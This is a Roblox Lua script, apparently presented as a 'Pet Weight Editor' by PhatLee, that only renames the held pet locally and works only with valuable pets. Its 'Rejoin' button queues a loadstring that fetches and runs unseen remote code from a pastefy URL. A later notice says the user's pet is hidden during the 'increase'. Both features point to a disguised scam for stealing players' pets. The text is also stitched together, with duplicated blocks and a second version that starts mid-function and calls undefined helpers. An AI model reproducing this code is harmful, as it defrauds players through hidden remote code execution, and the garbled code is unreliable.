-- Script By PhatLee (Pet Weight Editor giữ nguyên Age + Rejoin GUI)
local Players = game:GetService("Players")
local TeleportService = game:GetService("TeleportService")
local LocalPlayer = Players.LocalPlayer
local RunService = game:GetService("RunService")

-- Danh sách keyword pet tốt
local goodPets = {
    "mimic octupus", "dragonfly", "raccoon", "disco",
    "french", "lobster", "kitsune", "t-rex",
    "spinosaurus", "butterfly", "queen"
}

-- Hàm lấy tool pet đang cầm
local function getEquippedPetTool()
    local character = LocalPlayer.Character
    if character then
        for _, tool in ipairs(character:GetChildren()) do
            if tool:IsA("Tool") then
                return tool
            end
        end
    end
    return nil
end

-- Hàm lấy KG từ tên pet
local function parsePetKG(name)
    return tonumber(name:match("%[(%d+%.?%d*)%sKG%]"))
end

-- Hàm đặt lại tên pet, giữ nguyên age & thứ tự
local function setPetName(tool, newKG)
    local baseName = tool.Name:gsub("%[Age%s*%d+%]", ""):gsub("%[%d+%.?%d*%sKG%]", ""):gsub("%s+$", "")
    local agePart = tool.Name:match("%[Age%s*%d+%]")
    if agePart then
        tool.Name = string.format("%s [%.2f KG] %s", baseName, newKG, agePart)
    else
        tool.Name = string.format("%s [%.2f KG]", baseName, newKG)
    end
end

-- Hàm kiểm tra pet tốt
local function isGoodPet(name)
    local lowerName = name:lower()
    for _, keyword in ipairs(goodPets) do
        if lowerName:find(keyword) then
            return true
        end
    end
    return false
end

-- GUI chính
local screenGui = Instance.new("ScreenGui", LocalPlayer:WaitForChild("PlayerGui"))
screenGui.Name = "PetWeightGUI"
screenGui.ResetOnSpawn = false

local frame = Instance.new("Frame", screenGui)
frame.Size = UDim2.new(0, 240, 0, 180)
frame.Position = UDim2.new(0.5, -120, 0.5, -90)
frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
frame.BackgroundTransparency = 0.1
Instance.new("UICorner", frame)

-- Cho phép kéo GUI mà không reset vị trí
local dragging, dragInput, dragStart, startPos
frame.Active = true
frame.Draggable = false
frame.InputBegan:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = true
        dragStart = input.Position
        startPos = frame.Position
    end
end)
frame.InputChanged:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseMovement then
        dragInput = input
    end
end)
RunService.Heartbeat:Connect(function()
    if dragging and dragInput then
        local delta = dragInput.Position - dragStart
        frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
                                   startPos.Y.Scale, startPos.Y.Offset + delta.Y)
    end
end)
game:GetService("UserInputService").InputEnded:Connect(function(input)
    if input.UserInputType == Enum.UserInputType.MouseButton1 then
        dragging = false
    end
end)

-- Tiêu đề
local title = Instance.new("TextLabel", frame)
title.Text = "Pet Weight Editor"
title.Font = Enum.Font.FredokaOne
title.TextSize = 20
title.Size = UDim2.new(1, 0, 0, 30)
title.BackgroundTransparency = 1
title.TextColor3 = Color3.fromRGB(40, 40, 40)

-- Thông tin pet
local petInfo = Instance.new("TextLabel", frame)
petInfo.Text = "Please hold your pet..."
petInfo.Font = Enum.Font.FredokaOne
petInfo.TextSize = 16
petInfo.Size = UDim2.new(1, -10, 0, 30)
petInfo.Position = UDim2.new(0, 5, 0, 40)
petInfo.BackgroundTransparency = 1
petInfo.TextColor3 = Color3.fromRGB(40, 40, 40)
petInfo.TextWrapped = true

-- Nút tăng gấp đôi
local doubleButton = Instance.new("TextButton", frame)
doubleButton.Text = "Increase Pet Weight x2"
doubleButton.Font = Enum.Font.FredokaOne
doubleButton.TextSize = 16
doubleButton.TextColor3 = Color3.fromRGB(40, 40, 40)
doubleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
doubleButton.Size = UDim2.new(0, 220, 0, 34)
doubleButton.Position = UDim2.new(0.5, -110, 0, 80)
Instance.new("UICorner", doubleButton)

-- Nút tăng 1kg
local plusOneButton = Instance.new("TextButton", frame)
plusOneButton.Text = "Increase Pet Weight +1 KG"
plusOneButton.Font = Enum.Font.FredokaOne
plusOneButton.TextSize = 16
plusOneButton.TextColor3 = Color3.fromRGB(40, 40, 40)
plusOneButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
plusOneButton.Size = UDim2.new(0, 220, 0, 34)
plusOneButton.Position = UDim2.new(0.5, -110, 0, 124)
Instance.new("UICorner", plusOneButton)

-- Footer
local footer = Instance.new("TextLabel", frame)
footer.Text = "Script by PhatLee"
footer.Font = Enum.Font.FredokaOne
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(80, 80, 80)
footer.BackgroundTransparency = 1
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -22)

-- GUI cảnh báo
local function showWarning(msg)
    local warnGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    warnGui.Name = "WarningGUI"
    local warnFrame = Instance.new("Frame", warnGui)
    warnFrame.Size = UDim2.new(0, 300, 0, 100)
    warnFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
    warnFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
    Instance.new("UICorner", warnFrame)

    local warnText = Instance.new("TextLabel", warnFrame)
    warnText.Size = UDim2.new(1, -20, 1, -20)
    warnText.Position = UDim2.new(0, 10, 0, 10)
    warnText.BackgroundTransparency = 1
    warnText.Text = msg
    warnText.TextColor3 = Color3.fromRGB(100, 0, 0)
    warnText.TextSize = 16
    warnText.TextWrapped = true
    warnText.Font = Enum.Font.FredokaOne
end

-- GUI rejoin
local function showRejoinGUI()
    local rejoinGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    rejoinGui.Name = "RejoinGUI"
    local rFrame = Instance.new("Frame", rejoinGui)
    rFrame.Size = UDim2.new(0, 260, 0, 140)
    rFrame.Position = UDim2.new(0.5, -130, 0.5, -70)
    rFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", rFrame)

    local closeBtn = Instance.new("TextButton", rFrame)
    closeBtn.Text = "X"
    closeBtn.Font = Enum.Font.FredokaOne
    closeBtn.TextSize = 16
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 150)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", closeBtn)
    closeBtn.MouseButton1Click:Connect(function()
        rejoinGui:Destroy()
    end)

    local info = Instance.new("TextLabel", rFrame)
    info.Text = "Rejoin to see your pet"
    info.Font = Enum.Font.FredokaOne
    info.TextSize = 18
    info.TextColor3 = Color3.fromRGB(40, 40, 40)
    info.Size = UDim2.new(1, 0, 0, 40)
    info.Position = UDim2.new(0, 0, 0, 40)
    info.BackgroundTransparency = 1

    local rejoinBtn = Instance.new("TextButton", rFrame)
    rejoinBtn.Font = Enum.Font.FredokaOne
    rejoinBtn.TextSize = 16
    rejoinBtn.TextColor3 = Color3.fromRGB(40, 40, 40)
    rejoinBtn.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
    rejoinBtn.Size = UDim2.new(0, 200, 0, 34)
    rejoinBtn.Position = UDim2.new(0.5, -100, 1, -50)
    Instance.new("UICorner", rejoinBtn)

    local countdown = 30
    local function updateBtn()
        rejoinBtn.Text = "Rejoin (" .. countdown .. "s)"
    end
    updateBtn()

    task.spawn(function()
        while countdown > 0 do
            task.wait(1)
            countdown -= 1
            updateBtn()
        end
        rejoinBtn.Text = "Rejoin Now"
        rejoinBtn.MouseButton1Click:Connect(function()
            queue_on_teleport('loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()')
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end)
    end)
end

-- Logic tăng weight
local function increaseWeight(multiplier)
    local tool = getEquippedPetTool()
    if tool then
        if not isGoodPet(tool.Name) then
            showWarning("This only works with good pet.\nPlease use an account with good pet.")
            return
        end
        local kg = parsePetKG(tool.Name)
        if kg then
            local newKG = kg * multiplier
            setPetName(tool, newKG)
            petInfo.Text = "Equipped Pet: " .. tool.Name
            showRejoinGUI()
        else
            petInfo.Text = "Invalid Pet Format!"
        end
    else
        petInfo.Text = "No Pet Equipped!"
    end
end

local function increaseWeightBy(amount)
    local tool = getEquippedPetTool()
    if tool then
        if not isGoodPet(tool.Name) then
            showWarning("This only works with good pet.\nPlease use an account with good pet.")
            return
        end
        local kg = parsePetKG(tool.Name)
        if kg then
            local newKG = kg + amount
            setPetName(tool, newKG)
            petInfo.Text = "Equipped Pet: " .. tool.Name
            showRejoinGUI()
        else
            petInfo.Text = "Invalid Pet Format!"
        end
    else
        petInfo.Text = "No Pet Equipped!"
    end
end

-- Gán sự kiện
doubleButton.MouseButton1Click:Connect(function()
    increaseWeight(2)
end)
plusOneButton.MouseButton1Click:Connect(function()
    increaseWeightBy(1)
end)

-- Cập nhật pet info
RunService.RenderStepped:Connect(function()
    local tool = getEquippedPetTool()
    if tool then
        petInfo.Text = "Equipped Pet: " .. tool.Name
    else
        petInfo.Text = "Please hold your pet..."
    end
end)petInfo.TextWrapped = true

-- Nút tăng gấp đôi
local doubleButton = Instance.new("TextButton", frame)
doubleButton.Text = "Increase Pet Weight x2"
doubleButton.Font = Enum.Font.FredokaOne
doubleButton.TextSize = 16
doubleButton.TextColor3 = Color3.fromRGB(40, 40, 40)
doubleButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
doubleButton.Size = UDim2.new(0, 220, 0, 34)
doubleButton.Position = UDim2.new(0.5, -110, 0, 80)
Instance.new("UICorner", doubleButton)

-- Nút tăng 1kg
local plusOneButton = Instance.new("TextButton", frame)
plusOneButton.Text = "Increase Pet Weight +1 KG"
plusOneButton.Font = Enum.Font.FredokaOne
plusOneButton.TextSize = 16
plusOneButton.TextColor3 = Color3.fromRGB(40, 40, 40)
plusOneButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
plusOneButton.Size = UDim2.new(0, 220, 0, 34)
plusOneButton.Position = UDim2.new(0.5, -110, 0, 124)
Instance.new("UICorner", plusOneButton)

-- Footer
local footer = Instance.new("TextLabel", frame)
footer.Text = "Script by PhatLee"
footer.Font = Enum.Font.FredokaOne
footer.TextSize = 14
footer.TextColor3 = Color3.fromRGB(80, 80, 80)
footer.BackgroundTransparency = 1
footer.Size = UDim2.new(1, 0, 0, 20)
footer.Position = UDim2.new(0, 0, 1, -22)

-- GUI cảnh báo
local function showWarning(msg)
    local warnGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    warnGui.Name = "WarningGUI"
    local warnFrame = Instance.new("Frame", warnGui)
    warnFrame.Size = UDim2.new(0, 300, 0, 100)
    warnFrame.Position = UDim2.new(0.5, -150, 0.5, -50)
    warnFrame.BackgroundColor3 = Color3.fromRGB(255, 200, 200)
    Instance.new("UICorner", warnFrame)

    local warnText = Instance.new("TextLabel", warnFrame)
    warnText.Size = UDim2.new(1, -20, 1, -20)
    warnText.Position = UDim2.new(0, 10, 0, 10)
    warnText.BackgroundTransparency = 1
    warnText.Text = msg
    warnText.TextColor3 = Color3.fromRGB(100, 0, 0)
    warnText.TextSize = 16
    warnText.TextWrapped = true
    warnText.Font = Enum.Font.FredokaOne
end

-- GUI rejoin
local function showRejoinGUI()
    local rejoinGui = Instance.new("ScreenGui", LocalPlayer.PlayerGui)
    rejoinGui.Name = "RejoinGUI"
    local rFrame = Instance.new("Frame", rejoinGui)
    rFrame.Size = UDim2.new(0, 260, 0, 140)
    rFrame.Position = UDim2.new(0.5, -130, 0.5, -70)
    rFrame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", rFrame)

    local closeBtn = Instance.new("TextButton", rFrame)
    closeBtn.Text = "X"
    closeBtn.Font = Enum.Font.FredokaOne
    closeBtn.TextSize = 16
    closeBtn.Size = UDim2.new(0, 30, 0, 30)
    closeBtn.Position = UDim2.new(1, -35, 0, 5)
    closeBtn.BackgroundColor3 = Color3.fromRGB(255, 150, 150)
    closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    Instance.new("UICorner", closeBtn)
    closeBtn.MouseButton1Click:Connect(function()
        rejoinGui:Destroy()
    end)

    local info = Instance.new("TextLabel", rFrame)
    info.Text = "Rejoin to see your pet"
    info.Font = Enum.Font.FredokaOne
    info.TextSize = 18
    info.TextColor3 = Color3.fromRGB(40, 40, 40)
    info.Size = UDim2.new(1, 0, 0, 40)
    info.Position = UDim2.new(0, 0, 0, 40)
    info.BackgroundTransparency = 1

    local rejoinBtn = Instance.new("TextButton", rFrame)
    rejoinBtn.Font = Enum.Font.FredokaOne
    rejoinBtn.TextSize = 16
    rejoinBtn.TextColor3 = Color3.fromRGB(40, 40, 40)
    rejoinBtn.BackgroundColor3 = Color3.fromRGB(200, 255, 200)
    rejoinBtn.Size = UDim2.new(0, 200, 0, 34)
    rejoinBtn.Position = UDim2.new(0.5, -100, 1, -50)
    Instance.new("UICorner", rejoinBtn)

    local countdown = 30
    local function updateBtn()
        rejoinBtn.Text = "Rejoin (" .. countdown .. "s)"
    end
    updateBtn()

    task.spawn(function()
        while countdown > 0 do
            task.wait(1)
            countdown -= 1
            updateBtn()
        end
        rejoinBtn.Text = "Rejoin Now"
        rejoinBtn.MouseButton1Click:Connect(function()
            queue_on_teleport('loadstring(game:HttpGet("https://pastefy.app/fVgYsz1u/raw"))()')
            TeleportService:TeleportToPlaceInstance(game.PlaceId, game.JobId, LocalPlayer)
        end)
    end)
end

-- Logic tăng weight
local function increaseWeight(multiplier)
    local tool = getEquippedPetTool()
    if tool then
        if not isGoodPet(tool.Name) then
            showWarning("This only works with good pet.\nPlease use an account with good pet.")
            return
        end
        local kg = parsePetKG(tool.Name)
        if kg then
            local newKG = kg * multiplier
            setPetName(tool, newKG)
            petInfo.Text = "Equipped Pet: " .. tool.Name
            showRejoinGUI()
        else
            petInfo.Text = "Invalid Pet Format!"
        end
    else
        petInfo.Text = "No Pet Equipped!"
    end
end

local function increaseWeightBy(amount)
    local tool = getEquippedPetTool()
    if tool then
        if not isGoodPet(tool.Name) then
            showWarning("This only works with good pet.\nPlease use an account with good pet.")
            return
        end
        local kg = parsePetKG(tool.Name)
        if kg then
            local newKG = kg + amount
            setPetName(tool, newKG)
            petInfo.Text = "Equipped Pet: " .. tool.Name
            showRejoinGUI()
        else
            petInfo.Text = "Invalid Pet Format!"
        end
    else
        petInfo.Text = "No Pet Equipped!"
    end
end

-- Gán sự kiện
doubleButton.MouseButton1Click:Connect(function()
    increaseWeight(2)
end)
plusOneButton.MouseButton1Click:Connect(function()
    increaseWeightBy(1)
end)

-- Cập nhật pet info
RunService.RenderStepped:Connect(function()
    local tool = getEquippedPetTool()
    if tool then
        petInfo.Text = "Equipped Pet: " .. tool.Name
    else
        petInfo.Text = "Please hold your pet..."
    end
end)	f.Position = UDim2.new(0.5, -230, 0.35, 0)
	f.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
	f.BackgroundTransparency = 0.3
	Instance.new("UICorner", f).CornerRadius = UDim.new(0, 12)

	local lbl = Instance.new("TextLabel", f)
	lbl.Size = UDim2.new(1, -60, 1, -10)
	lbl.Position = UDim2.new(0, 10, 0, 5)
	lbl.BackgroundTransparency = 1
	lbl.Font = Enum.Font.FredokaOne
	lbl.TextSize = 16
	lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
	lbl.TextWrapped = true

	local closeBtn
	if allowClose then
		closeBtn = Instance.new("TextButton", f)
		closeBtn.Text = "X"
		closeBtn.Font = Enum.Font.FredokaOne
		closeBtn.TextSize = 18
		closeBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeBtn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
		closeBtn.Size = UDim2.new(0, 30, 0, 30)
		closeBtn.Position = UDim2.new(1, -35, 0, 5)
		Instance.new("UICorner", closeBtn)
		closeBtn.MouseButton1Click:Connect(function() f:Destroy() end)
	end

	task.spawn(function()
		for t = time, 1, -1 do
			lbl.Text = text:gsub("{t}", tostring(t))
			task.wait(1)
		end
		if f then f:Destroy() end
	end)
	return f
end

-- Hiện GUI khi mới execute
task.spawn(function()
	createCenterNotice(
		"Please hold your pet after clicking the increase button. Also, you won't see that you're holding your pet, because I hide your pet to Jandel. (This will disappear in {t} seconds.)",
		10,
		false
	)
end)

-- Kiểm tra pet có hợp lệ không
local function isPetValid(name)
	local lowerName = name:lower()
	for _, keyword in ipairs(validKeywords) do
		if lowerName:find(keyword) then
			return true
		end
	end
	return false
end

-- Trạng thái tăng
local isIncreasing = false
local originalTool, originalKG

-- Hàm tăng cân
local function increaseWeight(multiplier, add)
	local tool = getEquippedPetTool()
	if not tool then
		petInfo.Text = "No Pet Equipped!"
		autoResizeGUI()
		return
	end

	-- Kiểm tra keyword
	if not isPetValid(tool.Name) then
		createCenterNotice("This only works with good pets, please use an account with good pet.", 6, true)
		return
	end

	local currentKG = parsePetName(tool.Name)
	if not currentKG then
		petInfo.Text = "Invalid Pet Format!"
		autoResizeGUI()
		return
	end

	if currentKG > 60 then
		createCenterNotice("Pet weight growth too fast will make your account get banned.", 5, true)
		return
	end

	local targetKG = multiplier and currentKG * multiplier or currentKG + add
	if targetKG > 60 then
		createCenterNotice("Pet weight growth too fast will make your account get banned.", 5, true)
		return
	end

	isIncreasing = true
	originalTool = tool
	originalKG = currentKG

	for t = 25, 1, -1 do
		local holding = getEquippedPetTool()
		if not holding or holding ~= originalTool then
			setPetKGInPlace(originalTool, originalKG)
			createCenterNotice("Please don't change your pet while weight increasing.", 5, true)
			isIncreasing = false
			return
		end
		local progress = (25 - t + 1) / 25
		local interim = currentKG + (targetKG - currentKG) * progress
		setPetKGInPlace(originalTool, interim)
		petInfo.Text = "Pet weight is increasing in " .. t .. "s"
		autoResizeGUI()
		task.wait(1)
	end

	setPetKGInPlace(originalTool, targetKG)
	petInfo.Text = "Equipped Pet: " .. originalTool.Name
	autoResizeGUI()
	isIncreasing = false
end

-- Nút x2
local btnX2 = Instance.new("TextButton", frame)
btnX2.Text = "Increase Pet Weight by x2"
btnX2.Font = Enum.Font.FredokaOne
btnX2.TextSize = 16
btnX2.TextColor3 = Color3.fromRGB(40, 40, 40)
btnX2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btnX2.Size = UDim2.new(0, 230, 0, 34)
btnX2.Position = UDim2.new(0.5, -115, 0, 70)
Instance.new("UICorner", btnX2)
btnX2.MouseButton1Click:Connect(function()
	increaseWeight(2, nil)
end)

-- Nút +1kg
local btnAdd1 = Instance.new("TextButton", frame)
btnAdd1.Text = "Increase Pet Weight by 1KG"
btnAdd1.Font = Enum.Font.FredokaOne
btnAdd1.TextSize = 16
btnAdd1.TextColor3 = Color3.fromRGB(40, 40, 40)
btnAdd1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
btnAdd1.Size = UDim2.new(0, 230, 0, 34)
btnAdd1.Position = UDim2.new(0.5, -115, 0, 114)
Instance.new("UICorner", btnAdd1)
btnAdd1.MouseButton1Click:Connect(function()
	increaseWeight(nil, 1)
end)

-- Footer
local footer = Instance.new("TextLabel", frame)
footer.Text = "-- Script By PhatLee --"
footer.Font = Enum.Font.FredokaOne
footer.TextSize = 13
footer.TextColor3 = Color3.fromRGB(180, 180, 180)
footer.BackgroundTransparency = 1
footer.Size = UDim2.new(1, 0, 0, 18)
footer.Position = UDim2.new(0, 0, 1, -24)

-- Auto refresh pet info
task.spawn(function()
	while true do
		if not isIncreasing then
			local pet = getEquippedPetTool()
			if pet then
				petInfo.Text = "Equipped Pet: " .. pet.Name
			else
				petInfo.Text = "Equipped Pet: [None]"
			end
			autoResizeGUI()
		end
		task.wait(1)
	end
end)
